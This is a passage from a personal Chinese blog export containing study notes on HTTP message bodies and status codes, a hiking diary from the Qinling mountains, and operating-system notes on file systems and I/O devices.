<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(没有报文主体)</span><br><span class="line">	没有实体</span><br><span class="line">if(有报文主体)</span><br><span class="line">	if(有1个实体)</span><br><span class="line">		if(实体未被处理)	&#x2F;&#x2F;处理指: 传输中进行编码操作</span><br><span class="line">			无实体首部</span><br><span class="line">			实体主体&#x3D;&#x3D;报文主体</span><br><span class="line">		if(实体被处理)</span><br><span class="line">			有实体首部</span><br><span class="line">			实体主体!&#x3D;报文主体</span><br><span class="line">	if(有多个实体)</span><br><span class="line">		有实体首部</span><br><span class="line">		实体主体!&#x3D;报文主体</span><br></pre></td></tr></table></figure>
<p>个人理解,不一定对.</p>
<p><a href="https://www.zhihu.com/question/263752229" target="_blank" rel="noopener">知乎:http报文和实体的差别？</a></p>
<h4 id="压缩传输"><a href="#压缩传输" class="headerlink" title="压缩传输"></a>压缩传输</h4><p>将实体内容通过编码进行压缩, 常见的内容编码有:</p>
<ul>
<li>gzip</li>
<li>compress</li>
<li>deflate</li>
<li>identify (不进行编码)</li>
</ul>
<h3 id="分割传输"><a href="#分割传输" class="headerlink" title="分割传输"></a>分割传输</h3><p>将大容量的数据分割传输, 让浏览器逐步显示页面, 称作 <strong>分块传输编码</strong>(Chunked Transfer Coding).</p>
<p>实体被分割成的多个部分使用一个十六进制来标记块的大小. </p>
<h3 id="多部份对象集合"><a href="#多部份对象集合" class="headerlink" title="多部份对象集合"></a>多部份对象集合</h3><p><a href="https://en.wikipedia.org/wiki/MIME" target="_blank" rel="noopener"><em>Wiki:MIME</em></a></p>
<p>多功能Internet邮件扩展（MIME）是一种Internet标准，以支持除ASCII以外的字符集以及音频，视频，图像和应用程序附件的文本.</p>
<p>MIME使用了Multipart 的方法来容纳多种不同类型的数据, 这个方法也被HTTP 采纳.</p>
<ul>
<li><p>multipart/form-data</p>
<p>这是在Web上传表单时使用</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;AaB03x</span><br><span class="line"></span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fieldl&quot;</span><br><span class="line"></span><br><span class="line">Joe Blow</span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;pics&quot;: filename&#x3D;filel. txt&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">(fi1e1.txt的数据)</span><br><span class="line">--AaB03x--</span><br></pre></td></tr></table></figure>
<ul>
<li><p>multipart/byteranges</p>
<p>状态码206（Partial Content，部分内容）</p>
<p>响应报文包含了多个范围的内容时使用。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Http&#x2F;1.1 206 parTial Content</span><br><span class="line">Date: Fri, 13 Jul 2012 02: 45: 26 GMT</span><br><span class="line">Last-Modified: Fri, 31 Aug 2007 02: 02: 20 GMT</span><br><span class="line">Content-Type: multipart&#x2F;byteranges: boundary&#x3D;THIS_STRING_SEPARATES</span><br><span class="line"></span><br><span class="line">--THIS_STRING_SEPARATES</span><br><span class="line">Content-Type: application&#x2F;pdf</span><br><span class="line">Content-Range: bytes 500-999&#x2F;8000</span><br><span class="line"></span><br><span class="line">...(范围指定的数据)...</span><br><span class="line">--THIS_STRING_SEPARATES</span><br><span class="line">Content-Type: application&#x2F;pdf</span><br><span class="line">Content-Range: bytes 7000-7999&#x2F;8000</span><br><span class="line"></span><br><span class="line">...(范围指定的数据)...</span><br><span class="line">--THIS_STRING_SEPARATES--</span><br></pre></td></tr></table></figure>
<ul>
<li><p>在HTTP报文中使用多部分对象集合时，需要在首部字段里加上Content-type；</p>
</li>
<li><p>报文主体中包括多个实体,每个实体都由实体头部与实体主体组成</p>
<p>实体的头部与主体之间依旧使用CR+LF换行.</p>
</li>
<li><p>使用boundary字符串来划分多部分对象集合指明的各类实体。在boundary字符串指定的各个实体的起始行之前插入”—“标记作为结束.</p>
</li>
<li><p>也可以在某处嵌套使用多部份对象集合</p>
</li>
</ul>
<h3 id="范围请求"><a href="#范围请求" class="headerlink" title="范围请求"></a>范围请求</h3><p>指定范围发送的请求叫做<code>范围请求</code>(Range Request)。执行范围请求时，会用到首部字段<code>Range</code>来指定资源的byte范围。byte范围的指定形式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Range: bytes&#x3D;5001-10000	&#x2F;&#x2F;5001~10000字节</span><br><span class="line">Range: bytes&#x3D;5001-		&#x2F;&#x2F;从5001字节之后全部的</span><br><span class="line">Range: bytes&#x3D;-3000, 5000-7000	&#x2F;&#x2F;从一开始到3000字节和5000~7000字节的多重范围</span><br></pre></td></tr></table></figure>
<p>针对范围请求，响应会返回状态码为<code>206 Partial Content</code>的响应报文。</p>
<p>对于多重范围的范围请求，响应会在首部字段<code>Content-Type</code>表明<code>multipart/byteranges</code>后返回响应报文。</p>
<p>如果服务器端无法响应范围请求，则会返回状态码<code>200 OK</code>和完整的实体内容。</p>
<h3 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h3><p><code>内容协商</code>(Content Negotiation)机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。</p>
<p>包含在请求报文中的某些首部字段就是判断的基准，比如：<code>Accept</code>、<code>Accept-Charset</code>、<code>Accept-Encoding</code>、<code>Accept-Language</code>、<code>Content-Language</code>。</p>
<p>内容协商技术有以下3种类型：服务器驱动协商(Server-driven Negotiation)、客户端驱动协商(Agent-driven Negotiation)、透明协商(Transparent Negotiation)。</p>
<hr>
<h2 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h2><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>类别</th>
<th>原因短语</th>
</tr>
</thead>
<tbody>
<tr>
<td>1XX</td>
<td>Informational  (信息性状态码)</td>
<td>接收的请求正在处理</td>
</tr>
<tr>
<td>2XX</td>
<td>Success（成功状态码）</td>
<td>请求正常处理完毕</td>
</tr>
<tr>
<td>3XX</td>
<td>Redirection（重定向状态码）</td>
<td>需要进行附加操作以完成请求</td>
</tr>
<tr>
<td>4XX</td>
<td>Client Error（客户端错误状态码）</td>
<td>服务器无法处理请求</td>
</tr>
<tr>
<td>5XX</td>
<td>Server Error（服务器错误状态码）</td>
<td>服务器处理请求出错</td>
</tr>
</tbody>
</table>
</div>
<h3 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx 成功"></a>2xx 成功</h3><blockquote>
<p>表明请求被正常处理了</p>
</blockquote>
<ul>
<li><p>200(OK) : 正常处理, 该返回啥返回啥</p>
</li>
<li><p>204(No Content): 请求处理成功, 但没有资源可返回. 浏览器显示的页面不会更新.</p>
<p>一般用在只需要从客户端往服务器发送消息,而对客户端不需要发送新消息内容的情况下</p>
</li>
<li><p>206(Partial Content): 范围请求,响应报文中包含<code>Content-Range</code>指定范围实体</p>
</li>
</ul>
<h3 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h3><blockquote>
<p>表明浏览器需要执行某些特殊处理以正确处理请求</p>
</blockquote>
<ul>
<li>301(Moved Permanently): 永久性重定向,资源<code>URI</code>改变.</li>
<li>302(Found): 临时性重定向.希望用户(本次)使用新的<code>URI</code>访问</li>
<li>303(See Other): 和302来ISI,但是明确表示客户端应当采用GET方法获取资源.</li>
<li>304(Not Modified): 资源已找到,但未符合条件(不把任何相应主体).虽然是<code>3</code>系列,但和重定向没有关系</li>
<li>307(Temporary Redirect): 临时重定向.和<code>302</code>类似.</li>
</ul>
<h3 id="4xx-客户端错误"><a href="#4xx-客户端错误" class="headerlink" title="4xx 客户端错误"></a>4xx 客户端错误</h3><blockquote>
<p>表明客户端是发生错误的原因所在</p>
</blockquote>
<ul>
<li>400(Bad Request): 请求报文中存在语法错误.浏览器会像200一样对待此状态码</li>
<li>401(Unauthorized): 发送的请求需要通过<code>HTTP</code>认证.若之前已进行过一次请求,则表示用户认证失败.(初次会弹出认证用的对话框)</li>
<li>403(Forbidden): 对请求资源的访问被服务器拒绝了.服务端可以(也可以不)给出 <code>拒绝的详细理由</code></li>
<li>404(Not Found): 没有找到请求的资源. (也有可能是拒绝但且不想说明理由时使用)</li>
</ul>
<h3 id="5xx-服务器错误"><a href="#5xx-服务器错误" class="headerlink" title="5xx 服务器错误"></a>5xx 服务器错误</h3><blockquote>
<p>表明服务器本身发生错误</p>
</blockquote>
<ul>
<li>500(Internal Server Error): 执行请求时发生错误.可能是<code>Web</code>应用的<code>bug</code>或<code>临时故障</code></li>
<li>503(Service Unavailable): 服务器暂时处于超负荷或者正在进行停机维护.</li>
</ul>
<p>事实上不少返回的<code>状态码</code>是错误的.</p>
<p>此外, 服务器可以指定自己与客户端的协商状态码.</p>
<hr>
<h2 id="HTTP-首部"><a href="#HTTP-首部" class="headerlink" title="HTTP 首部"></a>HTTP 首部</h2><p>待完成</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>驭龙术</category>
        <category>Web开发</category>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>读书笔记:技术</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>山与水-漫步秦岭之子午古道</title>
    <url>/2020/08/05/%E5%B1%B1%E4%B8%8E%E6%B0%B4-%E6%BC%AB%E6%AD%A5%E7%A7%A6%E5%B2%AD%E4%B9%8B%E5%AD%90%E5%8D%88%E5%8F%A4%E9%81%93/</url>
    <content><![CDATA[<p>2020年8月2日    海拔1564</p>
<p>子午古道: 拐儿崖-金仙观-土地梁-尖山 (原路返回)</p>
<a id="more"></a>
<p>正儿八经的第一篇徒步记录. 其实是第二次徒步了, 上一篇见2020-07-2的周记. 前两天斥资五百大洋购买了正经装备, 拿这次热热身😄</p>
<p>学校还在因为疫情继续封闭, 大清早通过某种不可言说的手段溜了出来, 自行打车前往峪口. (大清早在省体集合真的对郊区不友好啊) 打车钱都快赶上参团费用了😭. 约八点二十抵达子午口保护总站, 大部队还没来. 琢磨了下子午峪的简介, 不感冒的看官可跳过~</p>
<blockquote>
<p>秦岭七十二峪之一，位于陕西省西安市境内。峪长六百六十里，北口曰子，在西安府南百里；南口曰午，在汉中府洋县东一百六十里。</p>
<p>子午古道始于战国，范睢相秦“栈道千里，通于蜀汉”，使天下畏秦。“子午”之名谢于西汉，西汉修建.长安城时中轴线其南端起于子午谷口。</p>
<p>子午至唐代变是通畅，巴蜀荔枝由此道直送长安，故又称荔枝道。该递在朝晚期左宗梁任扶甘总替时全线整修，现谷口的石拱桥即为当时所修。</p>
<p>——- 选自入口处石碑</p>
</blockquote>
<p>确实是从西安城里的子午大道正南方. <strong>“一骑红尘妃子笑，无人知是荔枝来”</strong>.自四川涪州置专驿直通长安。每年“飞骑驰进，七日七夜至京，人马多毙于路，百姓苦之”.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E4%BF%9D%E6%8A%A4%E7%AB%99.jpg" alt=""></p>
<p>入山需要刷身份证, 各位别忘了! 先乘摆渡车至金仙观, 领队带着简单热身之后便开始徒步, 最初一公里依旧是观光道, 虽有坡度但不算难走, 行走约一公里抵达第一个休息点(七里坪村) , 经人家, 过小河, 正式进入山道, 攀升二百余米, 抵达休息点二, 期间一路伴水, 两侧环山, 山泉潺潺, 草木环绕. 昨夜的夜雨夹杂着晨雾带来的露水打湿着蛛网与衣角, 倘若登山杖不小心打在什么树枝丫上, 水滴更是直直簌簌地落在身上, 引起同行者一片惊叫. 烦心的是山路混合着宿雨, 有几处略有湿滑. </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E6%99%A8%E9%9C%B2.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E5%B1%B1%E8%B7%AF.jpg" alt=""></p>
<p>从休息点二继续沿着山路行走, 不多时见着土地梁, 其实是路边一个小土地庙, 同行有人还去拜了拜, 这时领队芃芃喊我们看路边的小野瓜, 大家稍作休整,这才进入更陡峭的野道.此时已经约中午十一点, 日出而林霏开, 同行的小姐姐们发现路边的野蘑菇忽地冒了出来, 在大家不经意间身边就多了好些或白或黄的小蘑菇(当然我们也没作死去挑战), 值得一说的是, 我们下山再次路过它们的时候发现它们已经完全张开了, 此间对比的惊奇非亲历者不可察. </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E8%98%91%E8%8F%87.jpg" alt=""></p>
<p>一路攀登, 不少陡峭湿滑的路段大家互相帮助着都过来了. 到海拔1350左右的最后一个休息区. 领队瑞子说就在这里午餐休整, 想登顶的可以继续. 那我们肯定是继续冲呀哈哈. 最后这段山路我依旧打头, 比较难走, 两旁丛林茂密, 脚下山路难以辨认, 常常有巨石横于路中, 非得手脚并用才可以爬过去, 好在一路上不断有前人留下的引路标, 有时爬累了抬头看看不远处的尖山顶, 互相鼓励说就一点了, 已经望见山顶了 . 最后这两百米硬是爬了一个小时. 终于登顶! </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E5%B2%A9%E7%9F%B3.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E7%99%BB%E9%A1%B6.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E5%90%88%E7%85%A7.jpg" alt=""></p>
<p>不巧是此时山顶依旧云里雾里, 只能模糊看见近处山体. 返回休息区的路上云雾散去, 芃芃帮着大家拍了好些照片, 大感谢. </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E4%BA%91%E6%B5%B71.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E4%BA%91%E6%B5%B72.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E4%BA%91%E6%B5%B73.jpg" alt=""></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E7%85%A7%E7%89%87.jpg" alt=""></p>
<p>回到休息区, 领队带着食材整了个火锅. (山上一把火真的大丈夫?) 丸子火腿方便面真香. 还有同行的小姐姐前一天准备了好多吃的, 鸭脖鸡翅蛋挞水果…相比之下我是个蹭吃蹭喝的小废物😭</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E7%81%AB%E9%94%85.jpg" alt=""></p>
<p>大家还惊奇地发现不知道从哪儿冒出了一直贼乖巧的猫, 一直绕着你脚边伸懒腰———而且太乖巧好看以至于大家一致认为这不是野猫, 那怎么会有游客带着猫爬山呢? 还是说是附近农家养的猫, 已经习惯来找游客骗吃骗喝? 被骗的心甘情愿www</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E6%92%B8%E7%8C%AB.jpg" alt=""></p>
<p>小憩半小时, 原路返回. </p>
<p>回去路上发现原来大巴是过大学城的!!!!!! 那我直接在大学城等车不就好了为什么直接打车到峪口!!!! 贵死了都!!!!</p>
<p>写于 2020年8月5日</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/05/%E8%AE%B0%E5%BD%95.jpg" alt=""></p>
]]></content>
      <categories>
        <category>山与水</category>
        <category>不积硅步</category>
      </categories>
      <tags>
        <tag>游记</tag>
        <tag>漫步秦岭</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之文件系统</title>
    <url>/2020/08/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>本章将会涉及:</p>
<ol>
<li>文件</li>
<li>目录</li>
<li>文件系统的实现</li>
</ol>
<a id="more"></a>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>在进程的运行过程中出现了以下需求: 1) 需要储存大量信息; 2)信息需要保存至进程结束后; 3) 多个进程需要同时对数据进行操作.</p>
<p>为了解决以上问题, 我们将信息存储在磁盘和其他外部介质中, 称之为 <strong>文件</strong>.</p>
<h3 id="文件命名"><a href="#文件命名" class="headerlink" title="文件命名"></a>文件命名</h3><p>文件的命名要求因操作系统而已. </p>
<p>有的系统区分文件的大小写, 有的则不区分(MS-DOS).</p>
<p>许多OS使用字符<code>.</code>将文件名分成两部分, 后半部分称为 <strong>文件后缀名</strong>(file extension)</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/%E5%90%8E%E7%BC%80.png" alt=""></p>
<h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p>文件有多种组成结构</p>
<ol>
<li>byte sequence  文件由字节序列组成 (UNIX和WIN都是如此)</li>
<li>record sequence 文件由记录片组成(早期插卡式系统)</li>
<li>tree 树型 文件是一层层地储存的</li>
</ol>
<h3 id="文件分类"><a href="#文件分类" class="headerlink" title="文件分类"></a>文件分类</h3><p>由使用用途</p>
<ul>
<li>系统文件</li>
<li>用户文件</li>
<li>库文件</li>
</ul>
<p>由数据形式</p>
<ul>
<li>源文件</li>
<li>目标文件</li>
<li>可执行文件</li>
</ul>
<p>由权限</p>
<ul>
<li>只可执行文件</li>
<li>只读</li>
<li>读写</li>
</ul>
<p>由逻辑结构</p>
<ul>
<li>结构化数据</li>
<li>非结构化数据</li>
</ul>
<p>由(在硬盘上储存的)物理结构</p>
<ul>
<li>顺序文件</li>
<li>连接文件</li>
<li>索引文件</li>
</ul>
<p>UNIX和WIN都有常规文件和目录文件</p>
<p>UNIX中还有 字符设备文件 和块设备文件, 进程文件(伪文件)等特殊文件.</p>
<h3 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a>文件访问</h3><ul>
<li><p>顺序访问</p>
<p>只能从最开始访问</p>
<p>不能跳转</p>
</li>
<li><p>随机访问</p>
<p>以任意顺序访问</p>
</li>
</ul>
<h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><p>文件包括很多属性,见图</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7.png" alt=""></p>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
<li>创建</li>
<li>删除</li>
<li>打开</li>
<li>关闭</li>
<li>读</li>
<li>写</li>
<li>追加</li>
<li>查找</li>
<li>访问属性</li>
<li>设定属性</li>
<li>重命名</li>
</ul>
<hr>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="目录系统的种类"><a href="#目录系统的种类" class="headerlink" title="目录系统的种类"></a>目录系统的种类</h3><ul>
<li><p>单层析目录</p>
<p>ROOT 下直接跟随各种文件</p>
</li>
<li><p>双层次目录</p>
<p>ROOT 下由用户创建文件夹, 并在文件夹中储存文件</p>
</li>
<li><p>多层次目录</p>
<p>ROOT 下由用户创建文件夹, 并在文件夹中储存文件或文件夹</p>
</li>
</ul>
<h3 id="路径-⭐"><a href="#路径-⭐" class="headerlink" title="路径 ⭐"></a>路径 ⭐</h3><p>假设文件层次如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:</span><br><span class="line">├─other1</span><br><span class="line">└─usr</span><br><span class="line">    ├─ast</span><br><span class="line">    │  ├─mailbox</span><br><span class="line">    │  ├─myInfo.txt</span><br><span class="line">    │  └─other3</span><br><span class="line">    └─other2</span><br></pre></td></tr></table></figure>
<p>假设当前位于<code>ast</code>目录</p>
<ul>
<li><p>Absolute path name </p>
<p>绝对路径(从根目录起) 前加 <code>/</code> </p>
<ul>
<li><code>/usr/ast/mailbox</code> (UNIX)   访问mailbox文件夹</li>
<li><code>/usr/ast/myInfo.txt</code> (UNIX)   访问myInfo.txt</li>
<li><code>\usr\ast\mailbox</code> (Win)    访问mailbox文件夹</li>
</ul>
</li>
<li><p>Relative path name</p>
<p>相对目录(从当前目录开始) </p>
<ul>
<li><code>mailbox</code>    访问mailbox文件夹</li>
<li><code>./myInfo.txt</code> 访问myInfo.txt</li>
</ul>
<p>如访问当前目录的可执行文件，如果用相对路径必须是 ./filename</p>
</li>
<li><p>Working directory ( current directory) </p>
<ul>
<li><code>/usr/ast</code> 表示当前目录</li>
</ul>
</li>
</ul>
<h3 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h3><ul>
<li>Create</li>
<li>Delete</li>
<li>Opendir</li>
<li>Closedir</li>
<li>Readdir</li>
<li>Rename</li>
<li>Link(hard link/symbol link)</li>
<li>Unlink</li>
</ul>
<hr>
<h2 id="文件系统的实现"><a href="#文件系统的实现" class="headerlink" title="文件系统的实现"></a>文件系统的实现</h2><h3 id="文件系统布局"><a href="#文件系统布局" class="headerlink" title="文件系统布局"></a>文件系统布局</h3><p>文件都是储存在磁盘上的. 大多数磁盘都分为一个或多个区(Partitions) ,  每个区都有自己的独立文件系统.</p>
<p>磁盘的0扇区被称为 <strong>主引导区</strong> <strong>MBR</strong> (Master Boot Record) , 用于引导计算机启动.</p>
<blockquote>
<p> Sector 0 of the disk is called MBR (Master Boot Record) and is used to boot the computer.</p>
</blockquote>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%B8%83%E5%B1%80.png" alt=""></p>
<ul>
<li>Partition table: 给出每个分区开始结束的地址信息gives the starting and ending addresses of each partition. </li>
<li>Boot block: locate the active partition </li>
<li>Superblock: magic number, number of blocks, … </li>
<li>Free space mgmt: 使用位图/链表储存文件的空余信息</li>
<li>i-nodes: an array of data structure, one per file. </li>
<li>后面的部分就是真正的文件和目录内容了</li>
</ul>
<h3 id="文件的实现"><a href="#文件的实现" class="headerlink" title="文件的实现"></a>文件的实现</h3><ul>
<li>顺序存放</li>
<li>链接存放</li>
<li>使用FAT在内存中链接存放 </li>
<li>I-Node ⭐</li>
</ul>
<h4 id="顺序存放"><a href="#顺序存放" class="headerlink" title="顺序存放"></a>顺序存放</h4><p>就是顺序存放.</p>
<p>优点:</p>
<ul>
<li>简单</li>
<li>读的性能非常高效</li>
</ul>
<p>缺点</p>
<ul>
<li>文件如果后续需要删除, 重写会造成大量碎片</li>
</ul>
<p>常用于后续不会再写入数据. 如CD</p>
<h4 id="链接存放"><a href="#链接存放" class="headerlink" title="链接存放"></a>链接存放</h4><p>每个文件都指明下一个文件的指针</p>
<p>缺点: 随机访问非常非常慢, 找一个文件要从头找</p>
<h4 id="使用FAT在内存中链接存放⭐"><a href="#使用FAT在内存中链接存放⭐" class="headerlink" title="使用FAT在内存中链接存放⭐"></a>使用FAT在内存中链接存放⭐</h4><p>将文件的链接关系放在一张表中, 称为 <strong>文件分配表</strong> (( File Allocation Table), FAT) </p>
<p>缺点: 需要将整个文件系统的表(通常很大)载入内存.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/FAT.png" alt=""></p>
<h4 id="I-Node-⭐"><a href="#I-Node-⭐" class="headerlink" title="I-Node ⭐"></a>I-Node ⭐</h4><p>给每个文件赋予一个相关联的数据结构, 称为 <strong>索引节点</strong>（I-Node , index-node），该数据结构列出了文件块的<strong>属性</strong>和<strong>磁盘地址</strong>。仅在访问本文件时, 才需要将节点载入内存.</p>
<p>也有可能储存文件的磁盘地址比较多, 可以再指向另外一个储存地址的地址</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/inode.png" alt=""></p>
<h3 id="目录的实现"><a href="#目录的实现" class="headerlink" title="目录的实现"></a>目录的实现</h3><p>目录系统的主要功能是<strong>将文件的ASCII名称映射到定位数据所需的信息</strong>上。</p>
<p>Windows 系统给每个条目都分配了定长的数据段, 来保存文件的属性. </p>
<p>UNIX 系统给每个条目分配一个I-node的引用</p>
<h3 id="共享文件"><a href="#共享文件" class="headerlink" title="共享文件"></a>共享文件</h3><p>UNIX 提供共享文件的机制. 出现在多用户下.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/06/%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6.png" alt=""></p>
<p>C的一个文件出现在B的目录下。B的目录与该共享的联系称为一个连接 LINK.</p>
<p>问题：若目录中包含磁盘地址，则连接文件时，C目录的磁盘地址复制到B目录<br>中，若B或C后又加内容，则新的数据块只会列入进行添加工作的目录中。</p>
<h4 id="hard-link"><a href="#hard-link" class="headerlink" title="hard link"></a><strong>hard link</strong></h4><p>（硬连接或者实际连接）</p>
<p>由于Linux里面每个文件都对应一个inode，而文件名是记录在目录的block里的，也就是说文件名和inode没有关系，这样就可以把多个文件名对应同一个inode，这就是hard link，简单的说：hard link只是在某个目录下新建一条文件名连接到某inode号码的关联记录而已。</p>
<p>缺点</p>
<ul>
<li>不能够跨文件系统地做硬连接</li>
<li>不能够连接到目录</li>
</ul>
<h4 id="symbolic-link"><a href="#symbolic-link" class="headerlink" title="symbolic link"></a><strong>symbolic link</strong></h4><p>软连接或者符号连接</p>
<p>软连接创建一个新的文件，有自己的inode和block，只是在block里记录的是到连接目标文件的指向，读取到这个指向记录以后，系统再从根目录一层层进到目标文件的block里把数据读出来</p>
<p>symbolic link有如下特点：</p>
<p>1.等于是文件的一个“快捷方式”，只起一个指向作用</p>
<p>2.是一个独立的新文件，对目标文件没有任何影响</p>
<p>3.目标文件一旦删除，软连接会打不开</p>
<p>两种连接方式都存在的问题: 查找文件时会将同一个文件重复查询.</p>
<h3 id="Linux虚拟文件系统VFS"><a href="#Linux虚拟文件系统VFS" class="headerlink" title="Linux虚拟文件系统VFS"></a>Linux虚拟文件系统VFS</h3><p> 整个 Linux 系统通过 Virtual Filesystem Switch 的核心功能去 读取 filesystem。整个 Linux 认识的 filesystem 都是 VFS 在 进行管理，使用者并不需要知道每个 partition 的 filesystem 是什么</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/VFS.png" alt=""></p>
<p><em><u>其他了解即可</u></em></p>
<hr>
<p><strong>操作系统系列</strong></p>
<ol>
<li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li>
<li>操作系统之文件系统 (本文)</li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/08/操作系统之多处理器系统/" target="_blank" rel="noopener">操作系统之多处理器系统</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之IO管理</title>
    <url>/2020/08/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BIO%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>本章将涉及: </p>
<ol>
<li>IO设备</li>
<li>盘</li>
<li>时钟</li>
<li>其他</li>
</ol>
<p><em>本文匆匆赶制, 内容粗糙简陋  <del>背就完事了</del></em> </p>
<a id="more"></a>
<h2 id="IO设备"><a href="#IO设备" class="headerlink" title="IO设备"></a>IO设备</h2><h3 id="IO设备分类-⭐"><a href="#IO设备分类-⭐" class="headerlink" title="IO设备分类 ⭐"></a>IO设备分类 ⭐</h3><ul>
<li>块设备 (Block device)<ul>
<li>储存于固定大小的块中, 每块都有自己的地址</li>
<li>每个块都可以可以独立于其他块进行读写</li>
<li>例如: 磁盘</li>
</ul>
</li>
<li>字符设备 ( Character device )<ul>
<li>使用字符流进行传递</li>
<li>不可寻址, 没有任何查找功能</li>
<li>例如: 打印机, 键鼠</li>
</ul>
</li>
<li>其他<ul>
<li>时钟</li>
</ul>
</li>
</ul>
<p><em>我们接下来的讨论一般是针对块设备</em></p>
<h3 id="IO-设备部组成"><a href="#IO-设备部组成" class="headerlink" title="IO 设备部组成"></a>IO 设备部组成</h3><ul>
<li>机械部件(即普遍意义上的设备)</li>
<li>电子部件</li>
</ul>
<p>其中电子部件是用于控制管理机械部件的, 我们将电子部件称为 <strong>设备控制器</strong> .它的主要功能是: </p>
<p><em><u>知道作用</u></em></p>
<ul>
<li><p>Convert the serial bit stream into a block of bytes </p>
<p>将串行字节流转化未字节块</p>
</li>
<li><p>Perform any error correction necessary </p>
